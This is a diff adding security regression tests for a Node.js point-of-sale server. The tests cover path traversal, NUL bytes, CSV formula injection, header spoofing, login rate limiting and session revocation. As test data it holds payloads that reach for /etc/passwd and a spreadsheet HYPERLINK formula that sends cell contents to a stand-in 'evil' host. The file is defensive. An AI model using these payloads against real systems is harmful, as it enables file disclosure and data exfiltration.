@@ -5,10 +5,13 @@ const test = require('node:test');
 const assert = require('node:assert');
 const crypto = require('node:crypto');
 const fs = require('node:fs');
+const http = require('node:http');
 const path = require('node:path');
 const os = require('node:os');
 
 const { createApp } = require('../server/main');
+const { Router, sendCSV } = require('../server/core/http');
+const { clientIp } = require('../server/core/auth');
 
 function tempDb() {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'op-test-'));
@@ -202,4 +205,115 @@ test('security: static file traversal stays forbidden (regression guard)', async
   assert.equal(res.status, 403);
   const res2 = await fetch(base + '/..%2F..%2Fetc%2Fpasswd');
   assert.equal(res2.status, 403);
+});
+
+test('security: malformed percent-escapes are a 400, never a process kill', async (t) => {
+  const { server, base } = await startServer();
+  t.after(() => server.close());
+  // pre-fix: decodeURIComponent threw outside any try/catch, the dispatch
+  // promise was discarded, and the unhandled rejection exited the process
+  const bad = await fetch(base + '/%zz');
+  assert.equal(bad.status, 400);
+  assert.equal((await bad.json()).error, 'bad_request');
+  const badApi = await fetch(base + '/api/%zz');
+  assert.equal(badApi.status, 400);
+  // a corrupt cookie must not fail the request either: it is treated as absent
+  const badCookie = await fetch(base + '/api/health', { headers: { cookie: 'opsid=%zz' } });
+  assert.equal(badCookie.status, 200);
+  const meBadCookie = await fetch(base + '/api/auth/me', { headers: { cookie: 'opsid=%zz' } });
+  assert.equal(meBadCookie.status, 401); // fails closed, not open
+  // and the server answered all of that without dying
+  assert.equal((await fetch(base + '/api/health')).status, 200);
+});
+
+test('security: static serving cannot escape into a sibling of webRoot', async (t) => {
+  // /%2e%2e%2f survives WHATWG dot-segment normalization; a prefix-only
+  // containment check then let it reach any sibling whose name starts with
+  // the webRoot string (e.g. an operator's `cp -r web web.bak`)
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'op-web-'));
+  fs.mkdirSync(path.join(dir, 'web'));
+  fs.mkdirSync(path.join(dir, 'web.bak'));
+  fs.writeFileSync(path.join(dir, 'web', 'index.html'), '<h1>ok</h1>');
+  fs.writeFileSync(path.join(dir, 'web.bak', 'secrets.env'), 'OWLPOS_SECRET=deadbeef');
+  const router = new Router({ webRoot: path.join(dir, 'web'), resolveUser: () => null });
+  const server = http.createServer((req, res) => router.dispatch(req, res));
+  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+  t.after(() => server.close());
+  const base = `http://127.0.0.1:${server.address().port}`;
+
+  assert.equal((await fetch(base + '/')).status, 200); // legit traffic unaffected
+  const sibling = await fetch(base + '/%2e%2e%2fweb.bak%2fsecrets.env');
+  assert.equal(sibling.status, 403, 'sibling of webRoot must be unreachable');
+  const deep = await fetch(base + '/%2e%2e%2f%2e%2e%2fetc%2fpasswd');
+  assert.equal(deep.status, 403);
+  const nul = await fetch(base + '/index.html%00.png');
+  assert.equal(nul.status, 403, 'NUL bytes must not reach fs.readFile');
+});
+
+test('security: sendCSV neutralises formula cells, keeps numbers readable', () => {
+  let body = '';
+  const res = { writeHead() { return this; }, end(b) { body = b; } };
+  sendCSV(res, 'x.csv', [
+    ['reason', 'amount'],
+    ['=HYPERLINK("http://evil/"&A1,"x")', -1250],
+    ['@SUM(1+1)*cmd', '-12.50'],
+    ['+dial', '\tpayload'],
+    ['-note', 'a,b'],
+  ]);
+  const lines = body.trim().split('\n');
+  assert.equal(lines[1], `"'=HYPERLINK(""http://evil/""&A1,""x"")",-1250`);
+  assert.equal(lines[2], `'@SUM(1+1)*cmd,-12.50`);
+  assert.equal(lines[3], `'+dial,'\tpayload`);
+  assert.equal(lines[4], `'-note,"a,b"`);
+  // negative numbers — as numbers or preformatted strings — stay untouched
+  assert.ok(lines[1].endsWith(',-1250'));
+  assert.ok(lines[2].endsWith(',-12.50'));
+});
+
+test('security: X-Forwarded-For is ignored unless a trusted proxy is declared', () => {
+  const req = (xff) => ({ socket: { remoteAddress: '10.0.0.1' }, headers: { 'x-forwarded-for': xff } });
+  // default (no OWLPOS_TRUST_PROXY): the header is attacker-writable — ignore it
+  assert.equal(clientIp(req('6.6.6.6'), false), '10.0.0.1');
+  // opted in: the RIGHTMOST entry is the one the trusted proxy appended
+  assert.equal(clientIp(req('6.6.6.6'), true), '6.6.6.6');
+  assert.equal(clientIp(req('1.1.1.1, 2.2.2.2'), true), '2.2.2.2');
+  // garbage or missing forwarded values fall back to the TCP peer
+  assert.equal(clientIp(req('not-an-ip'), true), '10.0.0.1');
+  assert.equal(clientIp({ socket: { remoteAddress: '10.0.0.1' }, headers: {} }, true), '10.0.0.1');
+});
+
+test('security: a garbage-username flood cannot 429 another account\'s login', async (t) => {
+  const { server, base } = await startServer();
+  t.after(() => server.close());
+  const login = (username, password) => fetch(base + '/api/auth/login', {
+    method: 'POST', headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ username, password }),
+  });
+  // pre-fix the limiter keyed on the bare peer address, so 20 junk attempts
+  // (one attacker, or every station behind one proxy) 429'd the whole venue
+  for (let i = 0; i < 20; i++) assert.equal((await login('ghost', 'nope')).status, 401);
+  assert.equal((await login('ghost', 'nope')).status, 429, 'the flooded account is throttled');
+  const legit = await login('cashier', 'cashier');
+  assert.equal(legit.status, 200, 'other accounts from the same address still sign in');
+});
+
+test('security: logout revokes the token — a captured cookie dies at sign-out', async (t) => {
+  const { server, base } = await startServer();
+  t.after(() => server.close());
+  const login = await fetch(base + '/api/auth/login', {
+    method: 'POST', headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ username: 'admin', password: 'admin' }),
+  });
+  assert.equal(login.status, 200);
+  const cookie = login.headers.get('set-cookie').split(';')[0];
+  assert.equal((await fetch(base + '/api/auth/me', { headers: { cookie } })).status, 200);
+
+  const out = await fetch(base + '/api/auth/logout', {
+    method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: '{}',
+  });
+  assert.equal(out.status, 200);
+  // replaying the captured token string after sign-out must fail: sessions are
+  // stateless, so only the epoch bump — not the cleared browser cookie — kills it
+  const replay = await fetch(base + '/api/auth/me', { headers: { cookie } });
+  assert.equal(replay.status, 401);
 });
